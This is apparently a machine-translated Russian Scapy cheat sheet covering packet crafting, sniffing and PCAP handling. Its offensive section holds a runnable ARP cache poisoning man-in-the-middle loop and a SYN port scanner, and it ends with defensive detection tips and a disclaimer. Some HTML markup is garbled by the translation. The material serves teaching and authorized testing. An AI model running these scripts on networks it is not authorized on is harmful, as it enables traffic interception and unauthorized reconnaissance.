<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Сетевые атаки">
</p>

<p выравнивание="центр">
  <b>🐍 Новейший интерактивный инструмент и библиотека для манипулирования пакетами на основе Python, способные подделывать, отправлять, перехватывать, анализировать и фаззить произвольные сетевые пакеты</b>
</p>

---

## 📋 Содержание

- [Обзор и модель слоя штабелирования (`/`)](#-overview--the-stacking-layer-model-)
- [Установка](#-установка)
- [Запуск интерактивной оболочки](#-запуск-интерактивной-оболочки)
- [Создание сетевых пакетов](#-crafting-network-packets)
  - [Рукопожатия IP и TCP](#ip-and-tcp-handshakes)
  - [ICMP Ping и Traceroute](#icmp-ping--traceroute)
  - [DNS-запросы и разрешение](#dns-queries--разрешение)
- [Отправка и получение пакетов](#-отправка-получение-пакетов)
  - [Слой 3: `send()`, `sr()`, `sr1()`](#layer-3-send-sr-sr1)
  - [Уровень 2: `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
- [Прослушивание пакетов и обработка PCAP](#-packet-sniffing--pcap-handling)
  - [Захват живых пакетов (`sniff()`)](#capturing-live-packets-sniff)
  - [Чтение и запись файлов PCAP](#reading--writing-pcap-files)
- [Наступательные сетевые атаки](#-offensive-network-attacks)
  - [Отравление ARP-кэша (MITM)](#arp-cache-poisoning-mitm)
  - [Скрипт сканирования портов SYN](#syn-port-scanning-script)
  - [TCP SYN / ICMP флудинг](#tcp-syn--icmp-flooding)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и модель составного слоя (`/`)

Созданный **Филиппом Бионди**, **Scapy** заменяет десятки одноцелевых сетевых инструментов (ping, трассировка, arpspoof, заглушки nmap).

Гениальность Scapy заключается в использовании оператора деления Python (`/`) для объединения слоев протокола:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Каждое поле слоя имеет разумные значения по умолчанию, которые Scapy автоматически рассчитывает (контрольные суммы, длины, MAC-адреса, IP-адрес источника).

---

## 📥 Установка
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Запуск интерактивной оболочки

Запустите интерактивную оболочку REPL (для создания необработанных сокетов требуются права root):
```bash
sudo scapy
```
Проверьте доступные протоколы и функции внутри Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Создание сетевых пакетов

### Рукопожатия IP и TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP-пинг и трассировка
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### DNS-запросы и разрешение
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Отправка и получение пакетов

Scapy разделяет передачу по уровню OSI:

### Уровень 3: `send()`, `sr()`, `sr1()`
Работает с заголовками Ethernet, назначенными ядром (начинается с уровня IP):
- `send(pkt)`: передает пакет на уровне 3; не ждет ответа.
- `sr(pkt)`: отправляет пакеты и возвращает пары отвеченных и неотвеченных `(ans, unans)`.
- `sr1(pkt)`: отправляет пакет и возвращает только первый ответный пакет.

### Уровень 2: `sendp()`, `srp()`, `srp1()`
Пользовательский кадр Ethernet/канала передачи данных (начинается с `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: отправить необработанный кадр Ethernet.
- `srp(Ether() / ARP(...))`: отправить запрос ARP и получить ответ.

---

## 🔍 Обнаружение пакетов и обработка PCAP

### Захват живых пакетов (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Чтение и запись файлов PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Наступательные сетевые атаки

### Отравление ARP-кэша (MITM)
Подделать таблицы ARP для перехвата трафика между жертвой и шлюзом:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Скрипт сканирования портов SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда Скапи |
|-----------|----------------|
| **Запустить интерактивную оболочку** | `sudo scapy` |
| **Проверка полей протокола** | `ls(IP)` или `ls(TCP)` |
| **Отправить пакет L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Отправить и получить первый ответ**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Отправить кадр Ethernet L2** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Обнюхивание с помощью BPF-фильтра** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Сохранить в PCAP** | `wrpcap("out.pcap", pkts)` |
| **Чтение из PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Динамическая проверка ARP (DAI).** Настройте корпоративные коммутаторы с помощью DAI и DHCP Snooping, чтобы отбрасывать поддельные необоснованные ответы ARP.
2. **Правила IDS/Suricata.** Быстрые полуоткрытые проверки SYN и неверные комбинации флагов TCP (Xmas, NULL), генерируемые Scapy, вызывают стандартные оповещения IDS.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Scapy может генерировать некорректные пакеты, которые вызывают отказ в обслуживании или перехватывают частные данные. Его необходимо строго использовать при авторизованных оценках безопасности и изолированных сетях тестирования.